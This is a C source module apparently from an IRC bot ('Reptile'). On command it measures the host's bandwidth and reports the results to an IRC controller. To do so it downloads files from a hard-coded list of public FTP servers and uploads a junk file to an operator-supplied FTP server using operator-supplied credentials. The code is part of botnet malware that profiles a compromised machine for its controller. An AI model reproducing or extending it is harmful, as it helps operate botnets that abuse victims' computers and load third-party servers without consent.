/*
	Original Speedtest code by: vnet576 from: www.codelinx.net
	Ported to Reptile by someone you probably don't know.

	Anonymous Public FTP Servers:
	http://www.ftp-sites.org
*/

#include "includes.h"
#include "functions.h"

#ifndef NO_SPEEDTEST

float dmax = 0;
float dmin = 0;
float umax = 0;
float umin = 0;
float dtotal = 0;
float utotal = 0;
int dx = 0;
int ux = 0;

STSERVERS SpeedTestServers[]={
	// server			//download?				//path				//size rounded to nearest mb
	{"ftp.ea.com",			TRUE, "//pub//ea//patches//nfs//nfs-cd.zip",1},
	{"ftp.osc.edu",			TRUE, "//pub//bpowell//oscttssh.exe",1},
	{"ftp.ncsa.uiuc.edu",	TRUE, "//Mac//QuickTime//RealTime1.sea.bin",2},
	{"ftp.aol.com",			TRUE, "//aim//java//aim.exe",3},
	{"ftp.symantec.com",	TRUE, "//public//hungarian//liveupdate//lusetup.exe",4},
	{"download.nvidia.com",	TRUE, "//video//NVIDIA_EuroNews_English.wmv",4},
	
	//{"ftp.uni-bayreuth.de",	TRUE, "//pub//packages//adobe//acrobatreader//win//3.x//updaters//ocxinst.exe",1},
	//{"ftp.novell.com",			TRUE, "//pub//netwire//nsd//flsysft9.exe",1},
	//{"ftp.softcircuits.com",		TRUE, "//client//mcfiles.exe"},
	//{"ftp.physics.ohio-state.edu",TRUE, "//pub//mirrors//redhat//os//9//i386//isolinux//initrd.img"},

	// uploads
	{"ftp.demon.co.uk",		FALSE},
	{"space.mit.edu",		FALSE},
	{"ftp.gactr.uga.edu",	FALSE},
	{"ftp.novell.com",		FALSE},
	{"tsx-11.mit.edu",		FALSE},
	
	//{"a.cs.uiuc.edu",		FALSE},
	//{"ftp.ncsa.uiuc.edu",	FALSE},
	//{"ftp.orie.cornell.edu",FALSE},
	//{"ftp.osc.edu",		FALSE},

};
		
//idata1=ulsize
//idata2=dlsize
DWORD WINAPI SpeedTestThread(LPVOID param)
{  
	char /*sendbuf[IRCLINE], */remotefile[1024], /*stat[1024], */buffer[2048];

	sNTHREAD speedtest = *((sNTHREAD *)param);
    sNTHREAD *speedtestt = (sNTHREAD *)param;
	speedtestt->gotinfo = TRUE;
	IRC* irc=(IRC*)speedtest.conn;

	int start, stop;
	start = GetTickCount();	
    srand(GetTickCount());
    FILE *file;
    WSADATA wsadata;
    
    fWSAStartup(0x0202, &wsadata);
    
    file = fopen("1","w");
    for(int i = 0;i<(1024*(speedtest.idata1 > 0 && speedtest.idata1 < 50?speedtest.idata1:1));i++)
        fwrite(buffer, sizeof(buffer), 1, file);
    fclose(file);

	if (!speedtest.verbose && !speedtest.silent)
		irc->privmsg(speedtest.target,"%s Speedtest started: (This may take several minutes)", speedtest_title);

	if (speedtest.bdata2) {
		if (dtotal == 0) {
		
			if (speedtest.verbose)
				irc->privmsg(speedtest.target,"%s Displaying Downloads Speeds: (This may take several minutes)", speedtest_title);

			for(int i=0;i < (sizeof(SpeedTestServers) / sizeof(*SpeedTestServers));i++) {
				if (SpeedTestServers[i].download) {
					if (SpeedTestServers[i].mb <= speedtest.idata2 || speedtest.idata2==0)
						testftp(speedtest.conn,speedtest.target,speedtest.silent,speedtest.verbose,SpeedTestServers[i].host,SpeedTestServers[i].path,1);
				}
			}

			if (!speedtest.silent)	
				irc->privmsg(speedtest.target,"%s Download Statistics: [Max Speed]: %.2f KB/s. [Min Speed]: %.2f KB/s. [Average Speed]: %.2f KB/s",speedtest_title, dmax, dmin, (dtotal > 0?dtotal/dx:0));
			

		} else {
			irc->privmsg(speedtest.target,"%s Download Statistics (Cached): [Max Speed]: %.2f KB/s. [Min Speed]: %.2f KB/s. [Average Speed]: %.2f KB/s", speedtest_title, dmax, dmin, (dtotal > 0?dtotal/dx:0));
		}
	}

	if (speedtest.bdata1) {
		if (utotal == 0) {
			
			
			if (speedtest.verbose)
				irc->privmsg(speedtest.target,"%s Displaying Upload Speeds: (if lucky)", speedtest_title);

			sprintf(remotefile, "//%s//%d", speedtest.dir, rand()%9999999);

/* from ImNotET to s1nt3k
			for(int i=0;i < (sizeof(SpeedTestServers) / sizeof(*SpeedTestServers));i++) {
				if (!SpeedTestServers[i].download) {
					testftp(speedtest.conn,speedtest.target,speedtest.silent,speedtest.verbose,SpeedTestServers[i].host,remotefile,0);
				}
			}
int testftpul(void *conn, char *target, BOOL silent, BOOL verbose, char *host, char *port, char *folder, char *user, char *pass, int option);
*/
				testftpul(speedtest.conn,speedtest.target,speedtest.silent,speedtest.verbose,speedtest.server,speedtest.port,remotefile,speedtest.user,speedtest.pass,0);
			if (!speedtest.silent)
				irc->privmsg(speedtest.target,"%s Upload Statistics: [Max Speed]: %.2f KB/s. [Min Speed]: %.2f KB/s. [Average Speed]: %.2f KB/s", speedtest_title, umax, umin, (utotal > 0?utotal/ux:0));
			

		} else {
			irc->privmsg(speedtest.target,"%s Upload Statistics (Cached): [Max Speed]: %.2f KB/s. [Min Speed]: %.2f KB/s. [Average Speed]: %.2f KB/s", speedtest_title, umax, umin, (utotal > 0?utotal/ux:0));
		}
	}
    
    stop = GetTickCount();
    
	//sprintf(stat, "%s Finished Speedtest in: %.2d:%.2d.",speedtest_title,(((stop-start)/1000)%3600)/60, ((stop-start)/1000)%60);
    
	DeleteFile("1");
    fWSACleanup();

	clearthread(speedtest.threadnum);
	ExitThread(0);
}

int testftp(void *conn, char *target, BOOL silent, BOOL verbose, char *host, char *folder, int option)
{
	IRC* irc=(IRC*)conn;
    HINTERNET ftpopen=NULL, ftpconnect=NULL;
    DWORD filesize;
    HANDLE file=NULL;           
    float start, stop, speed, size;
    char *remotefile = folder;
	char *server = host;
//	char result[1024];
	start = (float)GetTickCount();
	
	ftpopen = fInternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT,	NULL, NULL,INTERNET_FLAG_ASYNC);
	if (ftpopen == NULL) {
        if (verbose)
			irc->privmsg(target,"%s Failed to initialize WinINet, error: <%d>", speedtest_title, GetLastError());
        return 0;
	}
    
	ftpconnect = fInternetConnect(ftpopen, server, INTERNET_DEFAULT_FTP_PORT, NULL, NULL, INTERNET_SERVICE_FTP, INTERNET_FLAG_EXISTING_CONNECT, 0);
    if (ftpconnect == NULL) {
        if (verbose)
			irc->privmsg(target,"%s Failed to connect to \"%s\", error: <%d>", speedtest_title, server, GetLastError());
        return 0;
	}
    
	if(option == 1) {
        if(fFtpGetFile(ftpconnect, remotefile, "Speed.Test", FALSE, FILE_ATTRIBUTE_NORMAL, FTP_TRANSFER_TYPE_BINARY | INTERNET_FLAG_RELOAD, 0) == FALSE) {
			if (verbose)
				irc->privmsg(target,"%s Failed to download \"%s\" from \"%s\", error: <%d>", speedtest_title, remotefile, server, GetLastError());
			return 0;
		}
    }
    else {

        if(fFtpPutFile(ftpconnect,"1", remotefile, FTP_TRANSFER_TYPE_BINARY | INTERNET_FLAG_RELOAD, 0) == FALSE) {
			if (verbose)
				irc->privmsg(target,"%s Failed to upload to \"%s\" (%s), error: <%d>", speedtest_title, server, remotefile, GetLastError());
			return 0;
		}
    }
    stop = (float)GetTickCount();
    if(option == 1) {
        file = CreateFile("Speed.Test", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        filesize = GetFileSize(file, NULL);
    }
    else {
        file = CreateFile("1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        filesize = GetFileSize(file, NULL);
    }
    size = (float)filesize/1024;
    speed = size/((stop - start)/1000); 
    
    if(speed > 0) {
        if(option == 1) {
            dtotal = dtotal + speed;
            dx++;
        }
        else {
            utotal = utotal + speed;    
            ux++;
        }
        if (verbose)
			irc->privmsg(target,"%s Server: %s, Country: %s, File Size: %.2f KB, Speed: %.2f KB/s", speedtest_title, host, checkhost(host), size, speed);
        statistics(speed, option);
    }
	fInternetCloseHandle(ftpconnect);
	fInternetCloseHandle(ftpopen);
	CloseHandle(file);
	DeleteFile("Speed.Test");
    return 0;
}

int testftpul(void *conn, char *target, BOOL silent, BOOL verbose, char *host, int port, char *folder, char *user, char *pass, int option)
{
	IRC* irc=(IRC*)conn;
    HINTERNET ftpopen=NULL, ftpconnect=NULL;
    DWORD filesize;
    HANDLE file=NULL;           
    float start, stop, speed, size;
    char *remotefile = folder;
	char *server = host;
//	char result[1024];
	start = (float)GetTickCount();
	
	ftpopen = fInternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT,	NULL, NULL,INTERNET_FLAG_ASYNC);
	if (ftpopen == NULL) {
        if (verbose)
			irc->privmsg(target,"%s Failed to initialize WinINet, error: <%d>", speedtest_title, GetLastError());
        return 0;
	}
    
	ftpconnect = fInternetConnect(ftpopen, server, port, user, pass, INTERNET_SERVICE_FTP,INTERNET_FLAG_EXISTING_CONNECT, 0);
    if (ftpconnect == NULL) {
        if (verbose)
			irc->privmsg(target,"%s Failed to connect to \"%s\", error: <%d>", speedtest_title, server, GetLastError());
        return 0;
	}
    
	if(option == 1) {
        if(fFtpGetFile(ftpconnect, remotefile, "Speed.Test", FALSE, FILE_ATTRIBUTE_NORMAL, FTP_TRANSFER_TYPE_BINARY | INTERNET_FLAG_RELOAD, 0) == FALSE) {
			if (verbose)
				irc->privmsg(target,"%s Failed to download \"%s\" from \"%s\", error: <%d>", speedtest_title, remotefile, server, GetLastError());
			return 0;
		}
    }
    else {


        if(fFtpPutFile(ftpconnect,"1", remotefile, FTP_TRANSFER_TYPE_BINARY | INTERNET_FLAG_RELOAD, 0) == FALSE) {
			if (verbose)
				irc->privmsg(target,"%s Failed to upload to \"%s\" (%s), error: <%d>", speedtest_title, server, remotefile, GetLastError());
			return 0;
		}
    }
    stop = (float)GetTickCount();
    if(option == 1) {
        file = CreateFile("Speed.Test", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        filesize = GetFileSize(file, NULL);
    }
    else {
        file = CreateFile("1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        filesize = GetFileSize(file, NULL);
    }
    size = (float)filesize/1024;
    speed = size/((stop - start)/1000); 
    
    if(speed > 0) {
        if(option == 1) {
            dtotal = dtotal + speed;
            dx++;
        }
        else {
            utotal = utotal + speed;    
            ux++;
        }
        if (verbose)
			irc->privmsg(target,"%s Server: %s, Country: %s, File Size: %.2f KB, Speed: %.2f KB/s", speedtest_title, host, checkhost(host), size, speed);
        statistics(speed, option);
    }
	fInternetCloseHandle(ftpconnect);
	fInternetCloseHandle(ftpopen);
	CloseHandle(file);
	DeleteFile("Speed.Test");
    return 0;
}

void statistics(float speed, int option)
{
    if(option == 1)
    {
        if(dmin == 0)
            dmin = speed;
        if(speed > dmax)
            dmax = speed;
        else if(speed < dmin)
            dmin = speed;
    }
    else
    {
        if(umin == 0)
            umin = speed;
        if(speed > umax)
            umax = speed;            
        else if(speed < umin)
            umin = speed;
    }
}

void ResetSpeedtestStats(BOOL ul, BOOL dl) {
	if (ul) {
		umax = 0; umin = 0;
		utotal = 0; ux = 0;
	}
	if (dl) {
		dmax = 0; dmin = 0;
		dtotal = 0; dx = 0;
	}
	return;
}
#endif